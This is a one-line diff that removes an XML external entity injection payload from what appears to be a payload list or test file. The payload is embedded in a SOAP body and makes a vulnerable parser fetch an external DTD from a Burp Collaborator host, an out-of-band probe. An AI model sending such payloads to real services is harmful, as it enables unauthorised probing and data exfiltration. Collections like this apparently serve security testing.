@@ -1,1 +1,0 @@
-<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://c3g5dvcest36udln5zx0sezan1twhl.burpcollaborator.net"> %dtd;]><xxx/>]]></foo></soap:Body>
